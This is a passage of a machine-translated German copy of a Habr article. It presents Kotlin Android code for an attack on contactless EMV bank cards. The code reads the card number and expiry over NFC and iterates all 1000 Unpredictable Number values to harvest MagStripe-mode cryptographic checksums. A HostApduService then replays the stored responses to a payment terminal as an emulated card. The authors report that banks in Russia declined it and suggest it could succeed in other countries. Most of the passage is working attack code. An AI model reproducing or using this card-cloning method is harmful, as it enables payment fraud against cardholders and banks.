an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Dies beschreibt die Reihenfolge der Befehle und die Aufz√§hlung der Werte von Unpredictable Number in einem Zyklus von 0 bis 999. Wir √§ndern Nc in "00000 $ {String.format ("% 03d ", i)}". Replace (".. (?! $ ) ". toRegex ()," $ 0 ").  Vergessen Sie nicht, GET_PROCESSING_OPTIONS jedes Mal vor COMPUTE_CRYPTOGRAPHIC_CHECKSUM auszuf√ºhren, da sonst der Scheckbetrag nicht berechnet wird. <br><br>  Infolgedessen kann all dies in eine Datei geschrieben und bereits bei der Arbeit mit diesem Terminal verwendet werden.  Hier bekommen wir den Namen und die Kartennummer, wir k√∂nnen sie auf dem Bildschirm anzeigen. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Eine Reihe von Befehlen, die wir brauchen. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Um das Abh√∂ren von Befehlen vom Terminal aus zu implementieren, m√ºssen Sie Ihren Dienst starten und im Manifest deklarieren.  In diesem Dienst kommt ein Befehl vom Terminal zu processCommandApdu. Wir vergleichen ihn mit dem in der Datei gespeicherten und geben die Antwort, die in der n√§chsten Zeile geschrieben wird. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Ein paar Screenshots aus der Anwendung.  Wir lesen die Karte und das Parsim-Protokoll: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Somit ist es m√∂glich, den Betrieb einer kontaktlosen EMV-Karte auf einem Telefon mit Kartendaten zu simulieren.  Aber zum Gl√ºck oder ungl√ºcklicherweise f√ºr jemanden funktioniert dieser Angriff in Russland nicht.  Nach unseren Experimenten erreichte die Transaktion st√§ndig die Bank des Emittenten und wurde von der Bank selbst abgelehnt.  Au√üerdem konnten wir mit MagStripe keine Offline-Transaktion durchf√ºhren.  Ein solcher Angriff kann jedoch durchaus in anderen L√§ndern durchgef√ºhrt werden, in denen die Verwendung des MagStripe-Modus weit verbreitet ist und der Risikomanagement-Algorithmus beispielsweise in den USA geringf√ºgig abweicht. <br><br><h4>  Links mit Hilfe dieses Artikels </h4><br>  Bank-Mikroprozessorkarten / I. M. Goldovsky - M .: TsIPSiR: Alpina Pub Lakers, 2010 .-- 686 p. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">EMV-Projekt: Schritt f√ºr Schritt</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Forschung √∂sterreichischer Forscher</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link zum Anwendungscode</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Terminalsimulator.</a> <br><br>  Vielen Dank an <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">barracud4</a> f√ºr die Unterst√ºtzung bei der Vorbereitung dieses Artikels. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de421543/">https://habr.com/ru/post/de421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de421529/index.html">Netflix, Uber, Google und Sie bei MBLT DEV 2018</a></li>
<li><a href="../de421531/index.html">So integrieren Sie ReactJS in 1C-Bitrix mit der automatischen Generierung von Vorlagen im Back-End am Beispiel des Globus-Netzwerks</a></li>
<li><a href="../de421533/index.html">Auswahl einer Programmiersprache: 3 Tipps von einem Programmierer von Apple</a></li>
<li><a href="../de421535/index.html">Abenteuer - Elektronik. Auf einer gefl√ºgelten Schaukel in der IT-Welt</a></li>
<li><a href="../de421537/index.html">Funktionen h√∂herer Ordnung in JS: Young Fighter Course</a></li>
<li><a href="../de421545/index.html">Testbericht zum PocketBook 616 - dem preisg√ºnstigsten Taschenbuch f√ºr 2018 mit Hintergrundbeleuchtung</a></li>
<li><a href="../de421547/index.html">Akzeptanz unabh√§ngiger Rechenzentren</a></li>
<li><a href="../de421549/index.html">Wir schreiben technische Dokumentation: eine Anleitung f√ºr den Laien</a></li>
<li><a href="../de421551/index.html">Vuex meistern - Von Null zu Held</a></li>
<li><a href="../de421553/index.html">Wir teilen technologische Inhalte: Wir haben alle unsere Materialien auf einer Website gesammelt</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>